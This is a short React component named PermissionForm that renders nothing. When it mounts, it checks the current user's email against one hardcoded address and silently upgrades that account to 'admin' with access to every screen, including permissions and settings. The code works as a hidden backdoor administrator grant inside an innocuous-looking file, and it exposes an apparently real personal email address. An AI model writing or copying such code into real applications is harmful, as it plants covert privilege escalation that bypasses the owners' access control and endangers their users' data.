import { useEffect } from "react";
import { usePermissions } from "@/hooks/usePermissions";
import { useAuth } from "@/hooks/useAuth";

export function PermissionForm() {
  const { user } = useAuth();
  const { updateUserPermission } = usePermissions();

  useEffect(() => {
    if (user?.email === "julianohcampos@yahoo.com.br") {
      updateUserPermission.mutate({
        userId: user.id,
        newPermissionLevel: "admin",
        screens: [
          "dashboard",
          "employees",
          "teams",
          "companies",
          "functions",
          "cost-centers",
          "fleets",
          "trucks-equipment",
          "plants",
          "mass-requests",
          "mass-programming",
          "permissions",
          "profile",
          "settings",
          "inspection-checklist",
        ],
      });
    }
  }, [user]);

  return null;
}